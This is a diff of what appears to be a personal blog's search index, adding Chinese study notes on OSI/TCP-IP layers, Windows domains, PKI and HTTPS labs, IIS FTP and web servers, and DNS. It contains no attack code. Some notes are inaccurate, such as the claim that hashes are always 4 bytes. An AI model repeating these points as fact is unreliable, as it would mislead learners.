@@ -529,6 +529,231 @@
     
     
     <entry>
+      <title>12、OSI和TCP/IP模型</title>
+      <link href="/2020/06/13/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/12OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/"/>
+      <url>/2020/06/13/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/12OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/</url>
+      
+        <content type="html"><![CDATA[<h2 id="OSI和TCP-IP模型"><a href="#OSI和TCP-IP模型" class="headerlink" title="OSI和TCP/IP模型"></a>OSI和TCP/IP模型</h2><h3 id="一、分层思想"><a href="#一、分层思想" class="headerlink" title="一、分层思想"></a>一、分层思想</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>1、降低工作量，提高工作效率。</p><p>2、每一层的工作和协议都是独立的（专注独立的做自己的事情）。</p><p>3、下层为上层提供服务。</p><h3 id="二、OSI七层模型-Open-System-interconnection"><a href="#二、OSI七层模型-Open-System-interconnection" class="headerlink" title="二、OSI七层模型(Open System interconnection)"></a>二、OSI七层模型(Open System interconnection)</h3><p>应用层：应用软件的信息协议（QQ、HTTP），主要用作是传输软件数据。</p><p>表示层：将信息通过字符编码协议进行数字编码。</p><p>会话层：协调应用会话的发送顺序。（QQ\WX\PUBG谁先从网线走，谁后走）</p><p>应用层、表示层和会话层 合并成一层！ 应用层！这就是TCP/IP五层模型！</p><h3 id="三、TCP-IP五层模型"><a href="#三、TCP-IP五层模型" class="headerlink" title="三、TCP/IP五层模型"></a>三、TCP/IP五层模型</h3><h4 id="前言"><a href="#前言" class="headerlink" title="- 前言"></a>- 前言</h4><p>虽然OSI七层模型是世界标准组织发布的第一个网络模型，但是实际上没有被广泛应用。被广泛应用至今的是TCP/IP五层模型。名字由来是因为TCP和IP协议是网络模型中最重要的两个协议。</p><p><a href="https://imgchr.com/i/NSrOUO"><img src="https://s1.ax1x.com/2020/06/14/NSrOUO.png" alt="NSrOUO.png"></a></p><h4 id="TCP-IP五层模型数据的封装与解封"><a href="#TCP-IP五层模型数据的封装与解封" class="headerlink" title="- TCP/IP五层模型数据的封装与解封"></a>- TCP/IP五层模型数据的封装与解封</h4><h5 id="数据包封装"><a href="#数据包封装" class="headerlink" title="==========数据包封装"></a>==========数据包封装</h5><p><strong>应用层</strong>：见上。<u>(HTTP 80、HTTPS 443、TELNET 23、FTP 20 21、RDP 3389、SMB 445、Mysql 3306 、DHCP 67/68 <strong>UDP</strong>、DNS 53 <strong>TCP&amp;UDP</strong>[1]、SMTP 25、POP3 110)</u>#缺省TCP协议#</p><p><strong>传输层</strong>：加一个TCP/UDP包头，主要目的是完成进程与进程之间通信，在数据包头中加入源端口号和目标端口号数据段。<u>（TCP、UDP）</u>{防火墙}</p><p><strong>网络层</strong>：加一个IP包头，源IP、目标IP。<u>（IP、ICMP、ARP）</u>{路由器}</p><p><strong>数据链路层</strong>（到达网卡）：网络层的数据 + MAC子层（帧头[火车头]）、FCS（帧尾[火车头]），形成一个帧数据包。<u>（MAC子层协议）</u>{交换机}</p><p><strong>物理层</strong>（网线）：一个一个帧包传输送走。{网线、空气、光纤}</p><h5 id="数据包解封"><a href="#数据包解封" class="headerlink" title="========数据包解封"></a>========数据包解封</h5><p>解封时，每一层只专注于自己加工的位置。</p><h5 id="术词定义"><a href="#术词定义" class="headerlink" title="术词定义"></a>术词定义</h5><p>1、高层数据：应用层的数据</p><p>2、段：传输层的数据。</p><p>3、报文/IP包/包：网络层的数据。</p><p>4、帧：数据链路层的数据，（MAC帧头、FCS帧尾）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">问题：1、每层常见协议 2、应用层常见协议端口 3、应用层和运输层的关联 4、每层的运输单元 5、每层的工作设备</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>11、Windows域</title>
+      <link href="/2020/06/09/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/11%E5%9F%9F/"/>
+      <url>/2020/06/09/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/11%E5%9F%9F/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Windows域"><a href="#Windows域" class="headerlink" title="Windows域"></a>Windows域</h2><h3 id="一、域的基本概念"><a href="#一、域的基本概念" class="headerlink" title="一、域的基本概念"></a>一、域的基本概念</h3><p>域（Domain）：一种<u>网络环境</u>。</p><p><strong>网络环境：</strong></p><p>1、域环境：不平等环境，角色有等级之分，更方便集中管理、统一管理。</p><p>2、工作组环境：默认模式，人人平等。缺点：不方便管理。</p><p><strong>域的特点</strong>：集中管理、统一管理。</p><p><strong>域的成员组成</strong>：</p><p>1、域控制器DC（Domain Controller）：AD活动目录、组策略GPO</p><p>2、成员机</p><p><strong>域名</strong>：整个域环境的名字（例如：qq.com）。</p><p><strong>主机名</strong>：域中的主机名（例如：zjc.qq.com），主机可以被分配到不同的OU中。</p><p><strong>OU（组织单位）</strong>：OU是组策略的下发单位，<strong>域也是OU，是最大的OU</strong>。</p><h3 id="二、组策略"><a href="#二、组策略" class="headerlink" title="二、组策略"></a>二、组策略</h3><p>组策略：Group Policy == GPO，可以对AD活动目录中的不同部门设置不同的GPO组策略，实现不同的控制。</p><p>下发组策略：使用<u>组策略管理</u>的模块进行设置。</p><p>组策略生效的顺序：L(本地)S(站点/林)D(域)OU(组织架构)</p><p><u>强制组策略</u>：使下级组织架构OU的组策略不生效（DC不下发下级组单位的组策略）。（右键策略 -》 强制）</p><p><u>阻止继承</u>：不继承上级的组策略，只生效自己OU设置的组策略。（）（右键组织架构文件夹 -》 组织继承）</p><p><u>让一个用户不受任何策略的影响</u>：设置该用户的组织单位策略强制，然后在强制策略的权限中将该用户添加，然后设置高级设置让此用户拒绝所有权限。</p><h3 id="三、域的部署"><a href="#三、域的部署" class="headerlink" title="### 三、域的部署"></a>### 三、域的部署</h3><p>要想部署域环境 —》 首先需要一台域控制器DC</p><p>要想安装一台DC –》 需要安装“AD活动目录” 和 “DNS服务器”</p><blockquote><p>活动目录：Active Directory == AD， DNS在域中的作用：定位寻址主机。</p></blockquote><hr><blockquote><p>实验环境：Win2008域控制、XP域用户、win7域用户</p><p>1、还原快照，开启2008虚拟机，桥接vmnet1，配置静态地址10.1.1.2/24（禁用ipv6！重开网卡清除ipv6缓存！）修改计算机名为DC1！</p><p>2、活动目录的安装向导：开始 -》 运行 -》 <strong>dcpromo</strong> -》 弹出向导 -》</p><p>选择向导中安装DNS服务器（方便正确关联，为了提醒自动安装DNS服务器，不要配置DNS地址）-》</p><p>林的概念（域（业务）、域树（加入业务分公司，形成域树）、森林（多个业务树））整个林中最牛逼的是第一个DC服务器 ，创建新林 -》</p><p>设置林根域的FQDN（完全限定域名） zjccorp.com -》</p><p>林功能级别，设置整个森林DC服务器的能力等级（服务器版本），所以其他域树一定不能低于这个服务器版本 （建议选2003） -》</p><p>域功能级别，设置该域的DC服务器的能力等级（服务器版本），所以该域中如果出现其他DC服务器，一定不能低于这个服务器版本（建议选择2003） -》</p><p>AD数据库、日志文件、策略文件的存储位置（默认）-》</p><p>设置一个目录还原模式的账户密码（123.com） -》</p><p>安装，勾选完成后重新启动</p><p>3、重启后登录DC：发现本地管理员Administrator已经升级成为域管理员 ==二级域名\用户名、本地来宾guest升级为域来宾账号。本地用户都移动到AD活动目录中去了。</p><p>4、验证DC是否部署成功：查看计算机名是否修改为 计算机名.二级域名.com，并且新增了域字段： zjccorp.com。</p><p>5、查看管理工具，新增了DNS、ACtive DIrectory*等。验证DNS是否部署成功。</p><p>6、打开Active Directory用户和计算机 ，验证是否可以打开、是否报错。发现Users中找到了我们原来的本地账户（已升级为域用户）。Domain Admins组、Domain Users（默认域用户都在这）组。computers用户计算机、Domain Controllers域控制器。</p><p>7、员工机器加入域，测试域是否部署成功：</p><p>将客户机Xp加入域：还原快照、桥接vmnet1、配置IP10.1.1.1/24、DNS服务、修改主机名</p><p>更改工作组到域：计算机管理 -》 更改工作组 -》隶属于域 zjccorp.com，输入域管理账户密码zjccorp.com\administrator ; 123.com。</p><p>8、服务器验证员工是否成功加入域：DCDomain Controller验证computer组是否加入客户机，看DNS是否存在客户机。</p><p>9、域控制器给员工创建域账号：一般用户登录名叫jiacheng.zhong，美式标记法。密码要符合复杂性要求123.com。查看users中，新增了域账户，隶属domain users组</p><p>10、员工登陆测试：选项 -》 选择本机工作组还是域 -》输入账号密码，成功登录</p><p>11、使用win7用户测试创建域用户以及登录一次</p><p>12、下发组策略是以部门为单位，所以要创建<strong>组织架构（OU）</strong>：</p><p>​            域 右键 -》 新建组织单位 -》 设置名称：天融信集团 ；</p><p>​            新建天融信集团的子组织单位： 右键天融信集团 -》 新建组织架构 </p><p>。。。。。。</p><p>​            组织中加入成员： 在 Users中选择用户 右键 -》 所有任务 -》 移动</p><p>13、创建组策略： 组策略管理 -》 右键OC -》 创建GPO，或者在已有的组策略对象中选择组策略链接</p><p>14、编辑组策略：对准策略右键编辑 -》 用户配置 （策略就近原则），使用服务器资源要启动共享，并设置NTFS权限！</p></blockquote><p>实验结果总结：主机要想在DNS服务器上注册，必须要配置DNS服务器！可以用员工账号去加入域。活动目录中的计算机名是主机的计算机名，DNS中的主机名也是计算机名。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>10、PKI（公钥基础设施）</title>
+      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/"/>
+      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h2 id="PKI（公钥基础设施）"><a href="#PKI（公钥基础设施）" class="headerlink" title="PKI（公钥基础设施）"></a>PKI（公钥基础设施）</h2><h3 id="PKI概述"><a href="#PKI概述" class="headerlink" title="PKI概述"></a>PKI概述</h3><p>Public Key Infrastructure(<em>PKI</em>),中文叫做公开密钥基础设施</p><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p><strong>PKI基础设施的组成</strong>：公钥加密技术、数字证书、CA、RA。</p><p><strong>信息安全三要素/四要素</strong>：机密性、完整性、身份验证（可用性？）、（不可否认性）</p><p><strong>使用到PKI技术的IT领域</strong>：https（s:SSL/pki）、VPN–IPsecVPN、VPN–部分远程访问VPN</p><h3 id="公钥加密技术"><a href="#公钥加密技术" class="headerlink" title="公钥加密技术"></a>公钥加密技术</h3><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p>算法概念：x+5=y，x原数据、y密文、5密钥。</p><h4 id="加密算法分类"><a href="#加密算法分类" class="headerlink" title="加密算法分类"></a>加密算法分类</h4><h5 id="1、对称加密算法：加密和解密的密钥一致。"><a href="#1、对称加密算法：加密和解密的密钥一致。" class="headerlink" title="1、对称加密算法：加密和解密的密钥一致。"></a>1、对称加密算法：加密和解密的密钥一致。</h5><p><strong>优点</strong>：加密速度快；<strong>缺点</strong>：密钥容易被截获</p><p><strong>常见算法</strong>：DES、3DES、<strong>AES</strong>。Data/Advanced Encryption Standard，AES最常见。</p><h5 id="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"><a href="#2、非对称加密算法：加密和解密的密钥不同，称为公私钥。" class="headerlink" title="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"></a>2、非对称加密算法：加密和解密的密钥不同，称为公私钥。</h5><p><strong>公私钥</strong>：非对称加密算法自己产生一对公私钥，不需要双方协商。（公钥私钥孪生，不可互相逆推）双方公钥明文发送，私钥自我保留。</p><p><strong>优点</strong>：安全（完整性、机密性）；<strong>缺点</strong>：效率低、速度慢。</p><p><strong>流程</strong>：<u>双方各持有RSA公私钥，然后交换公钥。使用对方公钥加密并使用哈希算法计算密文指纹，再使用私钥加密指纹。最后将加密指纹和密文共同发送。</u></p><p><u>私钥加密指纹，中间人可截取使用公钥破译但破译无意义，由于私钥完全隐私所以无法伪造指纹，以成功保证数据传输的完整性和机密性。</u></p><p><a href="https://imgchr.com/i/UCEIsS"><img src="https://s1.ax1x.com/2020/07/06/UCEIsS.png" alt="UCEIsS.png"></a></p><p><strong>第三方公证机构（证书颁发发机构 CA认证/RA注册审批）</strong>：为了防止中间人在一开始就伪装通信双方公钥进行消息截取，就要寻求<u>公证机构</u>的验证帮助。服务器在封闭安全的环境内向<u>公证机构</u>发送自己的域名、IP、公钥等信息，<u>公证机构</u>会对服务器的信息生成一个钢印（加密指纹）（通过哈希形成指纹然后使用私钥进行RSA加密），然后生成一个服务器数字证书（信息（域名、IP、公钥等信息）+钢印）发送给服务器。</p><p>后面服务器和客户机进行通信时，先发送数字证书给客户机，客户机使用公证机构的公钥对钢印进行RSA解密，得到HASH钢印指纹，再对除钢印以外的证书内容进行HASH计算得到HASH普通指纹，然后用普通指纹和钢印指纹进行对比，如果相同，则说明服务器是通过公证机构认证的、安全的服务器。</p><p><u>世界上比较出名的根证书颁发机构已经内置在了浏览器中。</u></p><p><a href="https://imgchr.com/i/UCVawQ"><img src="https://s1.ax1x.com/2020/07/06/UCVawQ.png" alt="UCVawQ.png"></a></p><p><strong>CA（证书颁发机构）</strong>：接受申请，制作<u>数字证书</u>，颁发<strong>数字证书</strong>。</p><p><strong>数字证书</strong>：用于公正并保证公钥的合法性</p><p><strong>数字证书格式</strong>：遵循X.509标准。</p><p><strong>证书内容</strong>：使用者的公钥、使用者的标识信息（域名、IP、名称、电子邮箱地址）、证书有效期、颁发者的标识信息（公证机构）、颁发者的数字签名（钢印）。</p><p><strong>常见算法</strong>：RSA（HTTPS用的算法）、DH（迪菲·赫尔曼发明）、</p><h5 id="3、哈希算法："><a href="#3、哈希算法：" class="headerlink" title="3、哈希算法："></a>3、哈希算法：</h5><p>常见的哈希算法：MD5、SHA</p><p>哈希加密算法不可逆。无论数据多大加密后都是4字节的哈希值（hash值、指纹、摘要）。<strong>主要用于计算数据是否正确与完整。</strong></p><h3 id="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"><a href="#实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）" class="headerlink" title="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"></a>实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）</h3><blockquote><p>实验目标：部署HTTPS服务器</p><p>实验环境：windows2008作为HTTPS服务器（10.1.1.2）、win7作为客户机（10.1.1.1），桥接vmnet1。</p><p>实验步骤：</p><p>1、还原快照、桥接、配置网络地址信息、禁用再启用（清除ipv6缓存信息）</p><p>2、安装IIS，windows2008服务安装包已经内置在系统中。计算机右键 -》服务器管理 -》添加角色 -》Web服务器（IIS） -》安装。<strong>不要动IIS自带的默认网站！默认网站会被CA装载服务网页！</strong></p><p>3、准备网站文件夹flower在D盘，在Web服务器中添加网站，<strong>绑定</strong>域名、IP、子网掩码，先使用的是http协议（因为暂时无法使用https）。设置默认文档。</p><p>4、在IIS中安装DNS角色。然后使用客户机尝试访问网站。</p><p>5、安装CA组件：计算机右键 -》服务器管理 -》添加角色 -》Active Directory证书颁发机构-》角色服务再选择证书颁发机构Web注册 -》修改CA的公用名称（CAzongju）-》安装，去Web服务器给注册网站绑定域名（<a href="http://www.ca.com).dns服务器域名解析.客户机访问www.ca.com/certsrv%E6%B5%8B%E8%AF%95%E3%80%82">www.ca.com）。DNS服务器域名解析。客户机访问www.ca.com/certsrv测试。</a></p><p>6、在windows2008的IIS中，写证书申请单：左键总服务器-》服务器证书-》创建证书申请-》通用名称必须和网站域名相同-》生成证书申请txt文件（base64编码）</p><p>7、向CA提交证书申请：在服务器上访问CA的注册网站（防止网页信任弹窗的方法：降低windows2008服务器的安全级别：服务器管理器-》配置IE EXC-》禁用） -》 申请证书 -》高级证书申请 -》使用base64编码申请 -》 提交</p><p>8、CA服务器审核并颁发证书：管理工具-》证书颁发机构-》挂起的申请-》右键所有任务、颁发。</p><p>9、服务器安装证书：服务器去证书申请网站-》查看挂起的申请证书-》下载证书。总Web服务器-》服务器证书-》完成证书申请-》写一个好记名称flower</p><p>10、服务器使用证书：选择Web服务器中的网页 -》 添加网页绑定 -》选择https类型并且选择刚刚安装的证书。</p><p>11、客户机使用https访问flower网站进行初步测试，会显示证书无效，但可继续访问。</p><p>12、客户机浏览器添加信任我们的证书机构（获得证书公钥）：去证书机构注册网站上下载当前CA机构证书。浏览器选项-》内容-》证书-》受信任的根证书颁发机构-》导入-》导入我们的CA机构证书。</p><p>或者直接双击CA机构证书-》安装证书-》浏览选择安装到受信任的根证书颁发机构。</p><p>13、禁用服务器的http访问，只允许https访问：Web服务器flower-》SSL设置-》选中要求SSL-》点击右侧的应用。然后验证是否成功。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>9、部署windows2008</title>
+      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/"/>
+      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/10%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/</url>
+      
+        <content type="html"><![CDATA[<h3 id="环境准备：部署windows2008"><a href="#环境准备：部署windows2008" class="headerlink" title="环境准备：部署windows2008"></a>环境准备：部署windows2008</h3><p>选择enterprise完整版本。自定义安装</p><p>1、新建文件夹windows2008-1，新建虚拟机（单个文件，稍后安装操作系统），插入ISO镜像，分配1G内存。</p><p>2、开机分区，20G给C盘，D盘进入系统再分。</p><p>3、安装完毕2008需要先设置高强度密码123.com</p><p>4、设置以后不弹出两个讨厌的对话框</p><p>5、调出桌面图标：开始-》搜索ion/图标-》显示或隐藏桌面图标</p><p>6、分区D盘格式化：计算机-》管理-》存储-》磁盘存储</p><p>7、关闭防火墙和自动更新</p><p>8、安装vmtools重启</p><p>9、搜索文件夹选项，关闭隐藏文件夹拓展名 -》 神秘的东方力量，重启验证</p><p>10、关机做快照</p><hr><p>查看Windows已打补丁信息：<code>systeminfo</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>8、IIS容器搭建——FTP服务器</title>
+      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="IIS容器搭建——FTP服务器"><a href="#IIS容器搭建——FTP服务器" class="headerlink" title="IIS容器搭建——FTP服务器"></a>IIS容器搭建——FTP服务器</h2><h3 id="1、FTP服务器概述"><a href="#1、FTP服务器概述" class="headerlink" title="1、FTP服务器概述"></a>1、FTP服务器概述</h3><p>File Transfor Protocol === 文件传输服务器</p><p>FTP服务器功能与SMB文件共享服务器（port445）几乎相同。</p><p>一般来说 公司内部文件共享使用SMB服务、对外文件共享使用FTP服务器</p><h3 id="2、FTP协议端口"><a href="#2、FTP协议端口" class="headerlink" title="2、FTP协议端口"></a>2、FTP协议端口</h3><p>20端口：数据端口（默认不开启，只有在传输数据时才打开使用，传输完毕，端口关闭）</p><p>21端口：控制端口（身份验证、指令传送等）</p><p><code>ftp://IP地址</code></p><h3 id="3、使用IIS容器发布部署FTP服务器"><a href="#3、使用IIS容器发布部署FTP服务器" class="headerlink" title="3、使用IIS容器发布部署FTP服务器"></a>3、使用IIS容器发布部署FTP服务器</h3><blockquote><p>1、服务器和客户机配置IP、子网掩码、ping通，服务器安装FTP服务器插件</p><p>2、默认FTP站点 C:\Inetpub\ftproot, 建议禁用默认的FTP站点</p><p>3、新建FTP文件夹（笔记、课件、上传作业）、创建FTP站点，设置FTP权限建议全选。<strong>（FTP权限和NTFS权限取交集）</strong></p><p>4、设置文件夹NTFS权限，测试FTP登录是否需要账户密码，如果仍然不需要，去服务器中将FTP站点属性的安全账户中把允许匿名连接关闭。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>7、IIS容器搭建——WEB服务器</title>
+      <link href="/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/2020/06/07/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/9IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="IIS容器搭建——WEB服务器"><a href="#IIS容器搭建——WEB服务器" class="headerlink" title="IIS容器搭建——WEB服务器"></a>IIS容器搭建——WEB服务器</h2><h3 id="1、Web服务器概述"><a href="#1、Web服务器概述" class="headerlink" title="1、Web服务器概述"></a>1、Web服务器概述</h3><p>web服务器一般也称为网页服务器、HTTP服务器。</p><p>通过Web服务器可以将我们做好的Web通过网络发布出去，让客户机通过网络可以远程访问。例如：京东Web服务器、百度Web服务器。</p><h3 id="2、协议"><a href="#2、协议" class="headerlink" title="2、协议"></a>2、协议</h3><p>前面已经学过：SMB协议、telnet协议、RDP协议、DHCP协议等。</p><p>Web服务器使用的协议是：<strong>http协议、https协议</strong>。</p><h3 id="3、HTTP-S协议端口号"><a href="#3、HTTP-S协议端口号" class="headerlink" title="3、HTTP/S协议端口号"></a>3、HTTP/S协议端口号</h3><p>http：80；https：443</p><h3 id="4、Web容器（Http服务软件）"><a href="#4、Web容器（Http服务软件）" class="headerlink" title="4、Web容器（Http服务软件）"></a>4、Web容器（Http服务软件）</h3><p><strong>微软：IIS</strong>（IIS服务软件额可以发布Web服务器、发布FTP服务器）</p><p><strong>Linux：Apache、Tomcat、nginx</strong>等</p><p><strong>第三方学习用：phpstudy、XAMPP、WAMP</strong>等等。</p><h3 id="5、服务器部署Web容器"><a href="#5、服务器部署Web容器" class="headerlink" title="5、服务器部署Web容器"></a>5、服务器部署Web容器</h3><blockquote><p>1、桥接客户机、服务器，配置IP、子网掩码。ping测试连通性</p><p>2、Windows2003光盘中“应用程序服务器”安装“IIS信息服务”的“万维网服务”插件。验证80端口是否打开。（安装报错的原因是光盘默认是D盘，但电脑中存在D盘，导致找不到光盘中的内容）</p><p>３、万维网服务管理－》默认网站属性－》主目录　找到IIS默认发布好的网页路径：C:\inetpub\wwwroot ，IIS提供的默认网站有漏洞，所以建议-》停止默认网站。停止后，网页服务器没有发布的网页了，再次查看发现80端口自动关闭了。</p><p>4、自定义新建发布网站，网页路径不要放在C盘！文件夹名不允许中文。</p><p>创建网页文件夹：D盘下建立文件夹-》两个html网页，一个网页超链接另一个；</p><p>发布网页：右键网页服务器-》新建网页-》描述是名称随便-》IP和端口号绑定-》选择发布网站文件夹并允许匿名访问网站-》访问权限读取即可                             </p><p>设置默认文档（首页s）：访问IP端口号自动首先打开的网页。网站属性-》文档-》添加默认文档</p><p>5、发布第二个网站：例如hr系统，发布好之后发现自动停止状态（80端口已经占用），改变端口，使用客户机尝试访问。（不要忘记设置默认文档）</p><p>6、发布第三个网站：端口8080（常见）</p><p>7、将baidu和flower绑定同一个端口号提供服务（hosts文件代替DNS服务器）。</p><p><strong>一个网页服务器发布多个网页同时同一个端口的方法，就是设置网页的高级网站标识，标识方式除了IP、端口号还需要主机头值（全限定域名）。设置好后，客户机需要通过域名访问，才能访问到对应的网页。（原理猜想：浏览器在通过DNS解析向服务器发送http请求时，会将客户机的访问域名也包括在数据包中，Web服务器就可以通过客户机的访问域名来给客户机返回网页了）</strong></p><p>8、发布两个动态网页：网站访问权限要勾选运行脚本、Web服务拓展开启Active Server Pages（ASP）。</p></blockquote><h3 id="6、网站类型"><a href="#6、网站类型" class="headerlink" title="6、网站类型"></a>6、网站类型</h3><h4 id="1）静态网站：无数据库操作"><a href="#1）静态网站：无数据库操作" class="headerlink" title="1）静态网站：无数据库操作"></a>1）静态网站：无数据库操作</h4><h4 id="2）动态网站：有数据库操作"><a href="#2）动态网站：有数据库操作" class="headerlink" title="2）动态网站：有数据库操作"></a>2）动态网站：有数据库操作</h4><p>前端和数据库连接的中间件：php、asp、python 。</p><p>微软IIS只支持：静态网站 + asp、sqlserver。</p><p>LAMP：Linux + apache + mysql + php; 静态网站 + php + mysql</p><p>WAMP：Windows + apache + mysql + php</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>6、DNS服务器部署与安全</title>
+      <link href="/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+      <url>/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="DNS服务器部署与安全"><a href="#DNS服务器部署与安全" class="headerlink" title="DNS服务器部署与安全"></a>DNS服务器部署与安全</h2><h3 id="1、DNS"><a href="#1、DNS" class="headerlink" title="1、DNS"></a>1、DNS</h3><p>Domain Name Service 域名服务</p><p>作用：为客户机提供域名解析服务（域名 –》IP地址）</p><h3 id="2、域名组成"><a href="#2、域名组成" class="headerlink" title="2、域名组成"></a>2、域名组成</h3><h4 id="域名组成概述"><a href="#域名组成概述" class="headerlink" title="域名组成概述"></a>域名组成概述</h4><p><strong>域名</strong>：如<a href="http://www.sina.com是一个域名,但严格意义来讲/">www.sina.com是一个域名，但严格意义来讲</a> sina.com 才被称为域名（全球唯一），www是主机名，可以随意起。比如blog.sina.com、nba.sina.com等等。</p><p><strong>全限定域名FQDN</strong>：主机名+域名 被称为FQDN(Fully Qualified Domain Name)全限定域名。</p><p><strong>比较出名的域名购买机构</strong>：万网。（购买域名需要备案、购买后可以注册DNS）</p><h4 id="域名组成"><a href="#域名组成" class="headerlink" title="域名组成"></a>域名组成</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com.</span><br><span class="line">二级域名.一级域名.顶级域名 根域</span><br></pre></td></tr></table></figure><h3 id="3、DNS服务器监听端口"><a href="#3、DNS服务器监听端口" class="headerlink" title="3、DNS服务器监听端口"></a>3、DNS服务器监听端口</h3><p>DNS服务监听端口：<strong>53</strong></p><h3 id="4、客户机处理域名请求的顺序"><a href="#4、客户机处理域名请求的顺序" class="headerlink" title="4、客户机处理域名请求的顺序"></a>4、客户机处理域名请求的顺序</h3><p>1、查找本地DNS缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;displaydns   查询DNS缓存</span><br><span class="line">ipconfig &#x2F;flushdns     清空刷新DNS缓存</span><br></pre></td></tr></table></figure><p>2、查询hosts文件（本地解析文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><strong>host文件中的内容会自动更新到本地DNS缓存内容，</strong>所以本地查询DNS解析的优先级hosts &gt; 本地DNS缓存。</p><p>3、查找不到就请求DNS服务器。</p><h3 id="5、DNS服务器处理域名请求的顺序"><a href="#5、DNS服务器处理域名请求的顺序" class="headerlink" 